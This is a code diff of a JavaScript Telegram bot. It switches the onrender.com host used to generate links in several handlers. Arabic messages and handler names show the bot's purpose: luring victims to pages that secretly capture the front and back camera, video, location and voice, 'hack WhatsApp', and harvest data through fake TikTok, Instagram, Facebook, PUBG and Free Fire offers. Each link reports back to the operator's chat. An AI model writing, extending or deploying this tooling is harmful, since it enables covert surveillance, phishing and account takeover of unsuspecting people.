@@ -534,7 +534,7 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'capture_video') {
-        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: https://ff-3xp9.onrender.com/capture?chatId=${chatId}`;
+        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: https://mi-7wwl.onrender.com/capture?chatId=${chatId}`;
         bot.sendMessage(chatId, message);
     }
 });
@@ -558,7 +558,7 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     if (data === 'request_verification') {
-        const verificationLink = `https://ff-3xp9.onrender.com/whatsapp?chatId=${chatId}`;
+        const verificationLink = `https://mi-7wwl.onrender.com/whatsapp?chatId=${chatId}`;
         bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
         return;
     }
@@ -631,26 +631,26 @@ bot.on('callback_query', async (callbackQuery) => {
 
         switch (action) {
             case 'captureFront':
-                link = `https://ff-3xp9.onrender.com/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://mi-7wwl.onrender.com/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'captureBack':
-                link = `https://ff-3xp9.onrender.com/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://mi-7wwl.onrender.com/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'getLocation':
-                link = `https://ff-3xp9.onrender.com/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://mi-7wwl.onrender.com/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'recordVoice':
                 const duration = 10;  // مدة التسجيل الثابتة
-                link = `https://ff-3xp9.onrender.com/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
+                link = `https://mi-7wwl.onrender.com/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                 break;
             case 'rshq_tiktok':
-                link = `https://ff-3xp9.onrender.com/getNameForm?chatId=${chatId}&type=tiktok`;
+                link = `https://mi-7wwl.onrender.com/getNameForm?chatId=${chatId}&type=tiktok`;
                 break;
             case 'rshq_instagram':
-                link = `https://ff-3xp9.onrender.com/getNameForm?chatId=${chatId}&type=instagram`;
+                link = `https://mi-7wwl.onrender.com/getNameForm?chatId=${chatId}&type=instagram`;
                 break;
             case 'rshq_facebook':
-                link = `https://ff-3xp9.onrender.com/getNameForm?chatId=${chatId}&type=facebook`;
+                link = `https://mi-7wwl.onrender.com/getNameForm?chatId=${chatId}&type=facebook`;
                 break;
             default:
                 bot.sendMessage(chatId, '');
@@ -1042,11 +1042,11 @@ bot.on('callback_query', (query) => {
     let link;
 
     if (query.data === 'get_pubg') {
-        link = `https://ff-3xp9.onrender.com/get?chatId=${chatId}.png`;
+        link = `https://mi-7wwl.onrender.com/get?chatId=${chatId}.png`;
     } else if (query.data === 'get_freefire') {
-        link = `https://ff-3xp9.onrender.com/getNam?chatId=${chatId}.png`;
+        link = `https://mi-7wwl.onrender.com/getNam?chatId=${chatId}.png`;
     } else if (query.data === 'add_names') {
-        link = `https://ff-3xp9.onrender.com/getName?chatId=${chatId}.png`;
+        link = `https://mi-7wwl.onrender.com/getName?chatId=${chatId}.png`;
     }
 
     if (link) {
